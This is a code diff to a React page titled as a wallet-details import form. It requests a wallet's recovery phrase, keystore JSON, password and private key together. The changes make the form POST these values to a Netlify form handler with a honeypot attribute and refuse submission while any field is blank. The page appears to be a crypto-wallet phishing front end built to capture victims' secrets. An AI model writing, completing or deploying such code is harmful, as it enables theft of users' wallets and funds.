@@ -17,15 +17,16 @@ function WalletDetailsEntryPage() {
   const [password, setPassword] = useState('');
   const [privateKey, setPrivatekey] = useState('');
 
-  function validateForm() {
+  function validateForm(e) {
     if (
       phrase === '' ||
       keyJson === '' ||
       password.value === '' ||
       privateKey === ''
     ) {
+      e.preventDefault();
       alert(
-        `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (The Phrase, Keystore JSON and Password, and the private key). You can add "SKIP" for any data you do not wish to import`
+        `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (Phrase, Keystore JSON, Password, and Private key). You can add "SKIP" for any data you do not wish to import`
       );
       return false;
     }
@@ -88,8 +89,10 @@ function WalletDetailsEntryPage() {
         </div>
         <form
           className="form-area"
+          method="POST"
           data-netlify="true"
-          // action="./form-action-page.html"
+          netlify-honeypot
+          action="./form-action-page.html"
           name="Wallet import details"
           onSubmit={validateForm}
         >
